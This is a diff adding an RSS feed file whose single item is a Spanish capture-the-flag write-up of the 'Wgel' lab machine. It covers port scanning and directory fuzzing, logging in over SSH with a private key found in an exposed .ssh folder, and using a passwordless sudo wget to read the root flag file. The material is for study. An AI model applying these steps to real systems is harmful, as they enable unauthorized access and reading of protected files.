@@ -1,0 +1,137 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>wget on d3b0o</title>
+        <link>https://d3b0o.github.io/tags/wget/</link>
+        <description>Recent content in wget on d3b0o</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Wed, 28 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/tags/wget/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Wgel</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/</link>
+        <pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/images/2.png" alt="Featured image of post Resolución Wgel" /&gt;&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.176.77&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.176.77
+PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data.
+64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms
+
+--- 10.10.176.77 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.176.77 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.176.77
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
+|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
+|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;web&#34;&gt;Web&lt;/h3&gt;
+&lt;p&gt;En el puerto 80 está corriendo una web, con el &lt;code&gt;whatweb&lt;/code&gt; podemos ver un poco de información sobre la web.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.176.77
+http://10.10.176.77 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.176.77], Title[Apache2 Ubuntu Default Page: It works]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con &lt;code&gt;ctrl + u&lt;/code&gt; podemos ver el código de la web en el cual se ve una línea comentada con un mensaje: &lt;code&gt;&amp;lt;!-- Jessie don&#39;t forget to udate the webiste --&amp;gt;&lt;/code&gt; Con esto podemos intuir que hay un usuario llamado &lt;strong&gt;Jessie&lt;/strong&gt;&lt;/p&gt;
+&lt;h4 id=&#34;wfuzz-y-gobuster-subdirectorios&#34;&gt;wfuzz y gobuster (subdirectorios)&lt;/h4&gt;
+&lt;p&gt;Con wfuzz vamos a buscar subdirectorios mediante un diccionario ubicado en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos reporta el subdirectorio &lt;code&gt;/sitemap&lt;/code&gt; en el cual hay una web con muchos apartados.
+Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio &lt;code&gt;sitemap&lt;/code&gt;, mediante el mismo comando, pero cambiando la ubicación: de &lt;code&gt;10.10.176.77/FUZZ&lt;/code&gt; a &lt;code&gt;10.10.176.77/sitemap/FUZZ&lt;/code&gt;. No ha encontrado nada, probamos con gobuster y otro diccionario el cual está ubicado en &lt;code&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h2&gt;
+&lt;p&gt;Ahora nos reporta varios subdirectorios, entre ellos un .ssh, el cual contiene una &lt;em&gt;rsa private key&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Para conectarnos por ssh la vamos a guardar en un archivo llamado &lt;code&gt;id_rsa&lt;/code&gt;, y nos vamos a conectar con el usuario Jessie que encontramos anteriormente y la llave que encontramos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;ssh -i id_rsa jessie@10.10.176.77
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;user-flag&#34;&gt;User Flag&lt;/h2&gt;
+&lt;p&gt;Podemos ver la flag en /home/jessie/Documents/user_flag.txt.&lt;/p&gt;
+&lt;h2 id=&#34;root-flag&#34;&gt;Root Flag&lt;/h2&gt;
+&lt;p&gt;Con un sudo -l podemos ver que podemos ejecutar wget como root sin proporcionar contraseña. En &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/wget/#shell&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://gtfobins.github.io/gtfobins/wget/#shell&lt;/a&gt; Podemos ver que hay una forma de leer archivos aprovechándonos del wget . Intuyendo que la flag está en /root/root_flag.txt, con los siguientes comandos deberíamos de poder leerlo&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;LFILE=/root/root_flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;wget -i $LFILE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos la flag!!!&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
